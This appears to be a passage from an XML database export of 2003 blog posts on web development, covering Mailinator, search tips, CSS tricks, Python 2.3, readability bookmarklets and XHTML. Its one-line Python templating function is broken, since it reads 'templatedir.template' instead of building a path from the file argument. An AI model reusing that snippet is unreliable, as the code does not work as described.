&lt;p&gt;Incidentally, this isn't the first time this problem has been tackled. See &lt;a href=&quot;http://www.onfocus.com/index.asp?xml=2002_11_01_past.xml#3005&quot; title=&quot;PGP-Signing&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;http://www.sixapart.com/log/2002/12/verifying_pgp_s.shtml&quot; title=&quot;Verifying PGP Signatures&quot;&gt;here&lt;/a&gt; for details of a system that uses &lt;acronym title=&quot;Pretty Good Privacy&quot;&gt;PGP&lt;/acronym&gt; to sign and verify comments.&lt;/p&gt;</field>
		<field name="created">2003-07-24 15:36:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1112</field>
		<field name="title">Mailinator and email validation</field>
		<field name="slug">mailinator</field>
		<field name="body">&lt;p&gt;So, &lt;a href=&quot;http://www.mailinator.com/&quot;&gt;Mailinator&lt;/a&gt; (via &lt;a href=&quot;http://www.joelonsoftware.com/items/2003/07/23.html&quot; title=&quot;Joel on Software: Wednesday, July 23, 2003&quot;&gt;Joel&lt;/a&gt;). It's a brilliant concept; whenever a site you don't trust insists on you giving them an email address you invent something-random@mailinator.com and give them that instead. Then you go to the Mailinator site, enter the something-random and see the emails recently sent to that address.&lt;/p&gt;

&lt;p&gt;As someone who dislikes having to tell sites my email address I love it. As someone who has run sites which insist on an email address I'm not so sure. Forced email registrations are frequently abused for harvesting emails for unwanted mail-outs, but they serve a very valuable purpose in protecting sites from abuse. If user's have to provide a &quot;real&quot; email address to sign up, you've got something concrete with which to ban them should they abuse your service. Sure, these days many people have a multititude of addresses but it's still a very useful deterrent against abuse. As services like Mailinator become more widespread, I can see web application maintainers needing to fight a constant battle to ban specific email providers from being used to sign up for accounts. It's that, or move to manually vetting every account which adds delays and seriously reduces people's motivation for signing up in the first place.&lt;/p&gt;</field>
		<field name="created">2003-07-24 15:59:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1113</field>
		<field name="title">Learn to search!</field>
		<field name="slug">learnToSearch</field>
		<field name="body">&lt;p&gt;Slate: &lt;a href=&quot;http://slate.msn.com/id/2085668/&quot;&gt;Digging for Googleholes&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://slate.msn.com/id/2085668/&quot;&gt;&lt;p&gt;
Type in the make and model of a new DVD player, and you'll get dozens of online electronic stores in the top results, all of them eager to sell you the item. But you have to burrow through the results to find an impartial product review that doesn't appear in an online catalog.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;http://www.google.com/search?q=sony+DVP-S550D&quot;&gt;sony DVP-S550D&lt;/a&gt; - shopping sites come out top&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.google.com/search?q=sony+DVP-S550D+review&quot;&gt;sony DVP-S550D review&lt;/a&gt; - review sites come out top&lt;/p&gt;

&lt;blockquote cite=&quot;http://slate.msn.com/id/2085668/&quot;&gt;&lt;p&gt;
Search for &quot;apple&quot; on Google, and you have to troll through a couple pages of results before you get anything not directly related to Apple Computer - and it's a page promoting a public TV show called Newton's Apple. After that it's all Mac-related links until Fiona Apple's home page. You have to sift through 50 results before you reach a link that deals with apples that grow on trees: the home page for the Washington State Apple Growers Association.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;http://www.google.com/search?q=apple&quot;&gt;apple&lt;/a&gt; - lots of stuff about Apple computers&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.google.com/search?q=apple+fruit&quot;&gt;apple fruit&lt;/a&gt; - lots of stuff about Apples, the fruit&lt;/p&gt;

&lt;p&gt;These are not even advanced search techniques. It's a basic rule of searching: if your first set of results aren't what you are looking for, enter more specific terms and try again.&lt;/p&gt;

&lt;blockquote cite=&quot;http://slate.msn.com/id/2085668/&quot;&gt;&lt;p&gt;
So, when you're doing research online, Google is implicitly pushing you toward information stored in articles and away from information stored in books. Assuming this practice continues, and assuming that Google continues to grow in influence, we may find ourselves in a world where, if you want to get an idea into circulation, you're better off publishing a PDF file on the Web than landing a book deal.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I'd say that day has already come (but replace &lt;acronym title=&quot;Portable Document File&quot;&gt;PDF&lt;/acronym&gt; with &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;), but I'm not sure I understand how this is a bad thing. Surely information is more valuable if it is searchable? Books are not going to die out because of the internet (how many people prefer reading from a screen?) but if you have an idea to share the internet is obviously a better medium - you reach millions more people for a fraction of the cost of traditional publishing.&lt;/p&gt;

&lt;p&gt;There are a lot of legitimate concerns about Google relating to its size and massive influence over the web's traffic, but concerns about skewed results are often the fault of the user rather than the tool. &lt;a href=&quot;http://www.google.com/help/basics.html&quot;&gt;Learn to search&lt;/a&gt;!&lt;/p&gt;</field>
		<field name="created">2003-07-24 16:17:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1114</field>
		<field name="title">More CSS tips and tricks</field>
		<field name="slug">cssTipsAndTricks</field>
		<field name="body">&lt;ul&gt;
 &lt;li&gt;Lachlan Cannon shows off some neat tricks for &lt;a href=&quot;http://illuminosity.net/thoughts/archives/2003/July/21/22:46:45/&quot;&gt;styling forms&lt;/a&gt; with minimal markup on the freshly redesigned illuminosity. I used his &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; for the forms in the &lt;a href=&quot;http://simon.incutio.com/auth/&quot;&gt;comment authentication prototype&lt;/a&gt; and it worked a treat.&lt;/li&gt;
 &lt;li&gt;Adam Kalsey struts his stuff with techniques for &lt;a href=&quot;http://kalsey.com/2003/07/css_dotted_borders_in_ie/&quot;&gt;dotted borders in IE&lt;/a&gt; and a nice new &lt;a href=&quot;http://kalsey.com/2003/07/rounded_corners_in_css/&quot;&gt;rounded box corners&lt;/a&gt; method.&lt;/li&gt;
 &lt;li&gt;Dave Shea &lt;a href=&quot;http://www.mezzoblue.com/cgi-bin/mt/mezzo/archives/000194.asp&quot;&gt;reclaims Times New Roman&lt;/a&gt;. I'd been avoiding it for so long I'd completely missed the idea of sprucing it up with &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. Lovely.&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2003-07-24 23:36:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1115</field>
		<field name="title">Ludicrously simple templates with Python</field>
		<field name="slug">simpleTemplates</field>
		<field name="body">&lt;p&gt;A long, long time ago I wrote my first ever &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; templating system. It was pretty simple; it consisted of a function that took two arguments: the name of a template file, and an associative array of replacements to make on that file.&lt;/p&gt;

&lt;p&gt;I've finally got around to playing with Python &lt;acronym title=&quot;Common Gateway Interface&quot;&gt;CGI&lt;/acronym&gt;s for web development recently, and decided I needed a similar system. Thanks to Python's powerful string formatting operator, it ended up as a one-liner:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;def template(file, vars):
    return open(templatedir.template, 'r').read() % vars
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Presuming you've set templatedir at the top of the script, the above function lets you load a template and make some simple replacements on it with a single function call. For example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;h3&amp;gt;%(title)s&amp;lt;/h3&amp;gt;

%(body)s

&amp;lt;p class=&quot;footer&quot;&amp;gt;Posted: %(date)s&amp;lt;/p&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the above saved in the template directory as &quot;entry.tpl&quot;, the template function above can be used thus:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;
print template('entry.tpl', {
    'title':'A blog entry', 
    'body':'Entry goes here...',
    'date':'3rd July 2003'})
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The work is all done by the &lt;code class=&quot;python&quot;&gt;% vars&lt;/code&gt; bit at the end of the line. Since vars is a dictionary, Python substitutes the named items in the dictionary for their corresponding &lt;code class=&quot;python&quot;&gt;%(varname)s&lt;/code&gt; tokens in the string loaded from the template file. More information on &lt;a href=&quot;http://www.python.org/doc/current/lib/typesseq-strings.html&quot; title=&quot;2.2.6.2 String Formatting Operations&quot;&gt;string formatting operations&lt;/a&gt; can be found in the manual.&lt;/p&gt;

&lt;p&gt;As templating systems go, it's far from the most useful or complete solution. It does however show that a little Python can go quite a long way.&lt;/p&gt;</field>
		<field name="created">2003-07-28 23:37:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1116</field>
		<field name="title">Better web forms</field>
		<field name="slug">betterWebForms</field>
		<field name="body">&lt;p&gt;Adam Kalsey has kicked off &lt;a href=&quot;http://kalsey.com/simplified/&quot;&gt;Simplified&lt;/a&gt;, a new series on web usability, with some &lt;a href=&quot;http://kalsey.com/simplified/form_errors/index.html&quot; title=&quot;Simplified Form Errors&quot;&gt;thoughts on creating usable web forms&lt;/a&gt;. The conversation &lt;a href=&quot;http://www.itnextgen.net/pseudo/archives/000052.html&quot; title=&quot;Forms that make sense&quot;&gt;continues&lt;/a&gt; on Paul Scrivens' blog, and covers a lot of interesting ground. D. Keith Robinson also has some tips on &lt;a href=&quot;http://www.7nights.com/dkrprod/gwt_four.php&quot;&gt;better form design&lt;/a&gt; in his latest Gorilla Web Tip.&lt;/p&gt;</field>
		<field name="created">2003-07-28 23:48:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1117</field>
		<field name="title">Let's go ::outside</field>
		<field name="slug">outside</field>
		<field name="body">&lt;p&gt;Tom Gilder has started a series of posts looking ahead to &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;3. In his &lt;a href=&quot;http://blog.tom.me.uk/2003/07/14/looking_ahead_to_css3_part_1_the_outside_pseudoelement.php&quot; title=&quot;Looking ahead to CSS3, Part 1: The ::outside pseudo-element&quot;&gt;first installment&lt;/a&gt;, he describes the awesomely powerful &lt;code class=&quot;css&quot;&gt;::outside&lt;/code&gt; pseudo-element. Using this, &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;3 authors can apply multiple backgrounds and borders to single elements (at the moment doing so requires fussing around with nested divs). If you don't instantly see the importance of this, take a look at some of the attempts to render rounded box corners using &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. All of them require the addition of extra presentational elements, none of which would be needed if we could use the &lt;code class=&quot;css&quot;&gt;::outside&lt;/code&gt; selector instead.&lt;/p&gt;
</field>
		<field name="created">2003-07-28 23:56:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1118</field>
		<field name="title">PHP XPath Implementation</field>
		<field name="slug">phpXpath</field>
		<field name="body">&lt;p&gt;This looks like it could be &lt;em&gt;really&lt;/em&gt; useful: an &lt;a href=&quot;http://www.carrubbers.org/scripts/php/xpath/&quot;&gt;XPath implementation in pure PHP&lt;/a&gt; (no extra modules required), via &lt;a href=&quot;http://www.whump.com/moreLikeThis/link/03560&quot; title=&quot;XPath Class for PHP&quot;&gt;More Like This&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-07-28 23:59:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1119</field>
		<field name="title">Validating HTML from behind a firewall</field>
		<field name="slug">intranetValidation</field>
		<field name="body">&lt;p&gt;Steve Clay's &lt;a href=&quot;http://mrclay.org/junk/software/private_validator/&quot;&gt;Private Validator&lt;/a&gt; is a really handy tool for people who working on intranet sites who want to be able to run them through the &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt;'s validator. It's a &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; script which you install on a server behind the firewall that has access to both the intranet and the outside world. It comes with a bookmarklet which activates the script. When the script is activated, it grabs the indicated page, then uploads it to the external validator and grabs the result. It's pretty neat, but even neater would be some kind of desktop application that did the same thing. I can almost feel a Python script coming on.&lt;/p&gt;</field>
		<field name="created">2003-07-29 23:24:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1120</field>
		<field name="title">Superb CSS template/tutorial</field>
		<field name="slug">lilyPad</field>
		<field name="body">&lt;p&gt;I'm not sure how I missed this one. Holly Bergevin's &lt;a href=&quot;http://positioniseverything.net/guests/3colcomplex.html&quot;&gt;Perched Upon a Lily Pad&lt;/a&gt; is a &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; demo that shows off a 3 column layout with a flexible header, full length columns, horizontal navigation bar and complete descriptions of exactly how it all works contained within the page. It's very educational (I've learnt a trick or two just by reading it) and a great example of solid, cross-browser &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; design.&lt;/p&gt;

&lt;p&gt;It's hosted as a guest demo over on &lt;a href=&quot;http://www.positioniseverything.net/&quot;&gt;Position is Everything&lt;/a&gt;, which now has four excellent layout demos.&lt;/p&gt;</field>
		<field name="created">2003-07-30 09:22:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1121</field>
		<field name="title">Quality news site URLs</field>
		<field name="slug">newsSiteURLs</field>
		<field name="body">&lt;p&gt;Nathan Ashby-Kuhlman is devoting this week on his blog to discussion and analysis of news site's &lt;acronym title=&quot;Uniform Resource Locators&quot;&gt;URL&lt;/acronym&gt;s.Nathan's &lt;a href=&quot;http://www.ashbykuhlman.net/blog/2003/07/27/2227&quot; title=&quot;Article URLs week: Principles&quot;&gt;5 attributes&lt;/a&gt; for a good &lt;acronym title=&quot;Uniform Resource Locators&quot;&gt;URL&lt;/acronym&gt; are worth repeating here as they succintly describe my own opinions:&lt;/p&gt;

&lt;dl&gt;
 &lt;dt&gt;Readability&lt;/dt&gt;
 &lt;dd&gt;URLs should be human-readable&lt;/dd&gt;
 &lt;dt&gt;Brevity&lt;/dt&gt;
 &lt;dd&gt;URLs should be short&lt;/dd&gt;
 &lt;dt&gt;Cleanliness&lt;/dt&gt;
 &lt;dd&gt;URLs should not contain useless parts&lt;/dd&gt;
 &lt;dt&gt;Hierarchy&lt;/dt&gt;
 &lt;dd&gt;URLs should be 'hackable' and dates should be year/month/day&lt;/dd&gt;
 &lt;dt&gt;Permanence&lt;/dt&gt;
 &lt;dd&gt;URLs should be permanently unique&lt;/dd&gt;
&lt;/dl&gt;

&lt;p&gt;I'm something of a fascist when it comes to &lt;acronym title=&quot;Uniform Resource Locators&quot;&gt;URL&lt;/acronym&gt;s; they are one of my first considerations when initially designing a site and for personal projects I refuse to compromise on them. Nathan's series is now on &lt;a href=&quot;http://www.ashbykuhlman.net/blog/2003/07/29/0923&quot; title=&quot;Article URLs week: Day 2&quot;&gt;day two&lt;/a&gt;, and true to his word he has been dissecting a number of large and not-so-large news sites and grading each one on the quality of their article &lt;acronym title=&quot;Uniform Resource Locators&quot;&gt;URL&lt;/acronym&gt;s.&lt;/p&gt;

&lt;p&gt;Steven Jarvis plays devil's advocate in &lt;a href=&quot;http://www.ashbykuhlman.net/blog/2003/07/29/0923&quot;&gt;the comments&lt;/a&gt;, asking a very interesting question about the value of &quot;hackable&quot; &lt;acronym title=&quot;Uniform Resource Locators&quot;&gt;URL&lt;/acronym&gt;s:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.ashbykuhlman.net/blog/2003/07/29/0923&quot;&gt;&lt;p&gt;
I've got a devil's advocate question for you: why do URLs need to be hackable? My wife (who is remarkably non-websavvy) would never in a thousand year think about hacking an URL. I'd say the same is true for at least 90% (and probably much higher than that) of the audience of news websites. *I* like hackable URLs, and I agree in general that they should be hierarchical, if only because I like at least the appearance (such as that given by liberal use of mod_rewrite) of a well-organized site. Isn't hacking an URL really just a fall-back point when the site's navigation fails you?
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Nathan's reply on the same page is worth reading. I agree with him; while hackable &lt;acronym title=&quot;Uniform Resource Locators&quot;&gt;URL&lt;/acronym&gt;s as an additional navigation aid add very little value to the &lt;em&gt;vast&lt;/em&gt; majority of surfers, they are a powerful indicator of the quality of a site's navigational structure. They also tend to be a by-product of a well thought out &lt;acronym title=&quot;Uniform Resource Locators&quot;&gt;URL&lt;/acronym&gt;s system, meaning if you are already following best practise for &lt;acronym title=&quot;Uniform Resource Locators&quot;&gt;URL&lt;/acronym&gt;s you can often gain hackability for a very low extra cost.&lt;/p&gt;</field>
		<field name="created">2003-07-30 09:42:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1122</field>
		<field name="title">Python 2.3</field>
		<field name="slug">python23</field>
		<field name="body">&lt;p&gt;After numerous alphas and betas, Python 2.3 has &lt;a href=&quot;http://www.python.org/2.3/&quot; title=&quot;Python 2.3&quot;&gt;been released&lt;/a&gt;. Python.org has &lt;a href=&quot;http://www.python.org/2.3/highlights.html&quot;&gt;highlights of the release&lt;/a&gt;, while A.M. Kuchling's &lt;a href=&quot;http://www.python.org/doc/2.3/whatsnew/&quot;&gt;What's New in Python 2.3&lt;/a&gt; goes in to a bit more detail. There's some great new stuff, but the feature that particularly caught my eye is this:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.python.org/2.3/highlights.html&quot;&gt;
&lt;p&gt;&lt;strong&gt;ssl&lt;/strong&gt; - the Windows installer now incorporates SSL support. (New in 2.3a2: timeouts set on the underlying socket are now handled correctly.)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;That's pretty sweet; with 2.3 we can deploy Windows applications that securely communicate over the internet out-of-the-box. Combined with web services and server-side content management systems that ability could be very useful indeed.&lt;/p&gt;

&lt;p&gt;Incidentally, since today is the 29th of June this release means that 2.3 has met the August 1st deadline for inclusion in the next version of Mac OS X. Owning a Mac is looking more and more attractive.&lt;/p&gt;</field>
		<field name="created">2003-07-30 10:58:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1123</field>
		<field name="title">On Metadata</field>
		<field name="slug">onMetadata</field>
		<field name="body">&lt;p&gt;Tim Bray's series On Search now has a &lt;a href=&quot;http://tbray.org/ongoing/When/200x/2003/07/30/OnSearchTOC&quot; title=&quot;On Search, the Series&quot;&gt;table of contents page&lt;/a&gt; linking to each of the previous entries. The &lt;a href=&quot;http://tbray.org/ongoing/When/200x/2003/07/29/SearchMeta&quot; title=&quot;On Search: Metadata&quot;&gt;most recent article&lt;/a&gt; covers metadata, and includes some insightful commentary on the huge problem of gathering metadata from users in the first place.&lt;/p&gt;</field>
		<field name="created">2003-08-02 21:06:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1124</field>
		<field name="title">Applications of RDF</field>
		<field name="slug">rdfApplications</field>
		<field name="body">&lt;p&gt;Shelley Powers: &lt;a href=&quot;http://www.xml.com/pub/a/2003/07/30/practicalRDF.html&quot;&gt;RDF: Ready for Prime Time&lt;/a&gt; gives an overview of the many applications and services already deployed that use &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; in some way. Via that article, &lt;a href=&quot;http://www.mozilla.org/rdf/doc/&quot;&gt;RDF in Mozilla Docs&lt;/a&gt; and &lt;a href=&quot;http://www.mozilla.org/rdf/50-words.html&quot;&gt;RDF in fifty words or less&lt;/a&gt;, both published by the Mozilla project.&lt;/p&gt;</field>
		<field name="created">2003-08-02 21:14:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1125</field>
		<field name="title">The Doomsday Algorithm</field>
		<field name="slug">doomsday</field>
		<field name="body">&lt;p&gt;I always thought you had to be an &lt;em&gt;idiot savant&lt;/em&gt; to be able to state the day of the week for any date in history, but it turns out there's a reasonably simple trick to it. The Doomsday Algorithm was first invented by Dr John Conway, also famous for creating the game of life. Rudy Limeback's &lt;a href=&quot;http://rudy.ca/doomsday.html&quot; title=&quot;Doomsday Algorithm&quot;&gt;detailed explanation&lt;/a&gt; provides everything you need to know about the algorithm, how it works and how to memorise it.&lt;/p&gt;</field>
		<field name="created">2003-08-02 21:19:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1126</field>
		<field name="title">Page Readability Bookmarks</field>
		<field name="slug">readabilityBookmarklets</field>
		<field name="body">&lt;p&gt;I've long been a proponent of flexible web pages rather than restricting sites to a hard coded width in pixels, but now that I've started surfing at 1280x1024 I'm beginning to realise how true the statements about an optimum width for readable text really are. The simple solution would be to surf with my browser window resized to a sensible size, but old habits die hard. Instead, I made myself the following bookmarklet:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;javascript:void(document.body.style.width=&amp;apos;500px&amp;apos;);void(document.body.style.position=&amp;apos;relative&amp;apos;);&quot;&gt;Narrow&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It resizes the current page to be 500 pixels wide, which for most flexible designs makes the text much easier to read. It's only tested on Firebird. I also find Verdana to be the most readable of the web fonts, so I've created the following bookmarklet which alters the default text style for the page - ideal for reading Slashdot ;)&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;javascript:void(document.body.style.fontFamily=&amp;apos;verdana&amp;apos;);void(document.body.style.fontSize=&amp;apos;small&amp;apos;);&quot;&gt;Verdana&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Both bookmarklets are extremely simple, but I have been using them all day and have found them very useful.&lt;/p&gt;</field>
		<field name="created">2003-08-02 21:26:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1127</field>
		<field name="title">Marketing Firebird</field>
		<field name="slug">marketingFirebird</field>
		<field name="body">&lt;p&gt;Blake Ross has published a page on &lt;a href=&quot;http://www.blakeross.com/firebird/marketing.html&quot;&gt;Marketing Firebird&lt;/a&gt;. He makes an interesting comparison between Firebird and Kazaa, pointing out that Kazaa has over 3.1 million downloads a week with promotion only via word-of-mouth:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Kazaa is spreading like wildfire because it offers a killer app - music sharing - and everyone knows it. I have friends that can't turn on their computer without help, but you'd better believe they're on there getting songs. I see people coming up with all kinds of clever taglines to promote Firebird (&quot;if you're not using Firebird, you're not surfing the web - you're suffering it&quot;) and that's great, but the fact is that 100 million users find Internet Explorer &quot;good enough.&quot; The promise of an improved overall experience, without identifying &lt;em&gt;how&lt;/em&gt; it improves on a working model, just isn't going to grab people.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Blake also sets a challenge: &lt;strong&gt;Make it your goal to convert five friends, coworkers, family members or other acquaintances to Firebird.&lt;/strong&gt; I'm happy to say I've done that already, but I don't see it as any reason to stop. I've also joined the Mozilla marketing mailing list, which is pretty low traffic at the moment but will hopefully pick up as word about it gets out.&lt;/p&gt;

&lt;p&gt;While I'm all for marketing Firebird, there is a pretty big fly in the ointment. If you take a look at the &lt;a href=&quot;http://download.com.com/3302-2356_4-10208564.html?pn=1&amp;amp;fb=2&quot;&gt;negative reviews on Downloads.com&lt;/a&gt; (there are positive ones as well) it seems an awful lot of new users have had their fingers burnt by issues that I've never even noticed. If we've learnt anything from the original launch of Netscape 6 it should be that a poor first impression lasts, so it's not worth pushing Firebird at anyone who is likely to write it off the first time it crashes on them. That said, I haven't had 0.6.1 crash once since I installed it, but it's still an issue that's worth baring in mind.&lt;/p&gt;</field>
		<field name="created">2003-08-03 21:33:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1128</field>
		<field name="title">XHTML for future-proof content</field>
		<field name="slug">futureProotContent</field>
		<field name="body">&lt;p&gt;Don Park &lt;a href=&quot;http://www.docuverse.com/blog/donpark/2003/07/31.html#a773&quot;&gt;questions&lt;/a&gt; the benefits of emitting &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;. In one sense, Don is right; publishing a whole site using &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; in this day and age brings very little benefit and can cause a great deal of grief. But just because &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; doesn't provide advantages when publishing whole sites does not mean it should be written off entirely. As I've said on this blog many times before, &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; offers an excellent format for future-proofing site content, especially chunks of content kept in a database. Keith D. Robinson makes some excellent points along the same lines in his latest essay, &lt;a href=&quot;http://www.7nights.com/asterisk/archives/standards_semantic_markup_distributed_authorship_and_knowledge_management.php&quot;&gt;Standards, Semantic Markup, Distributed Authorship and Knowledge Management&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.7nights.com/asterisk/archives/standards_semantic_markup_distributed_authorship_and_knowledge_management.php&quot;&gt;&lt;p&gt;
XHTML is, at it's most basic, much simpler and easier to learn that traditional HTML 4.0.  With a simple style guide, standard markup and CSS styles you can accomplish almost all the formatting a content author would need, just by knowing a handful of markup tags.  Instead of trusting the CMS to sort out code from Word, for example, you can hand a content owner a cheat sheet with the basic tags outlined and trust that they can code their own content.  I mean, really, how hard is is to learn 10 or so tags?  Team this technique with a tool like Contribute and you've got a nice, simple and cheap process that, while doesn't store you content in a database, keeps it in a clean, standard form you can repurpose down the road.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;As for ensuring entered &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; is valid, I think this site's comment system does a pretty good job of showing how that can be achieved with only a small amount of server side effort.&lt;/p&gt;</field>
		<field name="created">2003-08-03 21:39:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1129</field>
		<field name="title">Excellent PHP 5 Overview</field>
		<field name="slug">php5Overview</field>
		<field name="body">&lt;p&gt;HarryF's &lt;a href=&quot;http://www.sitepoint.com/article/1192&quot;&gt;PHP5: Coming Soon to a Webserver Near You&lt;/a&gt; is the most detailed overview of the features we can expect from the next major &lt;acronym title=&quot;PHP: Hypetext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; release that I've seen yet.&lt;/p&gt;</field>
		<field name="created">2003-08-03 21:41:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1130</field>
		<field name="title">Minor comment system improvements</field>
		<field name="slug">minorCommentImprovements</field>
		<field name="body">&lt;p&gt;I should have made these a long time ago: thanks &lt;a href=&quot;http://blog.natbat.co.uk/&quot;&gt;Nat&lt;/a&gt; for reminding me ;) Comments no longer require an email address, and provide a proper error page with the comment intact if you forget to enter your name. They also now add http:// on to your site URL for you if you forget to enter it yourself. I added the last feature in the code that displays the comments, so it should fix all of the older comments with invalid &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt;s as well.&lt;/p&gt;

&lt;p&gt;I plan to have another go at the &lt;a href=&quot;http://simon.incutio.com/archive/2003/07/24/commentAuthenticationPrototype&quot; title=&quot;Comment Authentication Prototype&quot;&gt;signing prototype&lt;/a&gt; and fix some of the bugs in the current version some time next week.&lt;/p&gt;</field>
		<field name="created">2003-08-03 21:58:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1131</field>
		<field name="title">A better image replacement technique</field>
		<field name="slug">betterReplacement</field>
		<field name="body">&lt;p&gt;Over on Kryogenix, Stuart has &lt;a href=&quot;http://www.kryogenix.org/code/browser/lir/&quot; title=&quot;A new image replacement technique&quot;&gt;solved&lt;/a&gt; the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; image replacement problem with some clever application of the &lt;code class=&quot;css&quot;&gt;overflow: hidden;&lt;/code&gt; property. &lt;a href=&quot;http://www.stopdesign.com/articles/css/replace-text/&quot; title=&quot;Using Background-Image to Replace Text&quot;&gt;The Fahrner Image Replacement technique&lt;/a&gt; is often used to replace a heading with a background image (see most of the designs in the &lt;a href=&quot;http://www.csszengarden.com/&quot;&gt;CSS Zen Garden&lt;/a&gt; for examples), but has the disadvantages that it requires an additional &lt;code class=&quot;html&quot;&gt;&amp;lt;span&amp;gt;&lt;/code&gt; tag to be added to the code and that some screen readers which follow the &lt;code class=&quot;css&quot;&gt;display: none;&lt;/code&gt; directive skip straight over the replaced text without reading it. Stuart's new technique solves both problems, and works in modern browsers from IE 5/Win upwards.&lt;/p&gt;</field>
		<field name="created">2003-08-05 11:30:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1132</field>
		<field name="title">More links</field>
		<field name="slug">moreLinks</field>
		<field name="body">&lt;p&gt;Clearing out another several days worth of tabs. Some day I'm gonna get me a link-roll.&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.happycog.com/lectures/dwws/&quot;&gt;Zeldman's presentation on web standards&lt;/a&gt;, including a &lt;a href=&quot;http://www.happycog.com/lectures/dwws/24.html&quot;&gt;gallery of commercial sites&lt;/a&gt; designed with &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.mezzoblue.com/cgi-bin/mt/mezzo/archives/000207.asp&quot; title=&quot;Writing Assignments, FIR&quot;&gt;mezzoblue is now in CSS&lt;/a&gt;, accompanied by great news of a revivial of the excellent glasshaus web development book series.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://uche.ogbuji.net/uche.ogbuji.net/tech/4Suite/anobind/&quot;&gt;Anobind&lt;/a&gt;, a Pythonic &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; &lt;acronym title=&quot;Application Programming Interface&quot;&gt;API&lt;/acronym&gt;.&lt;/li&gt;
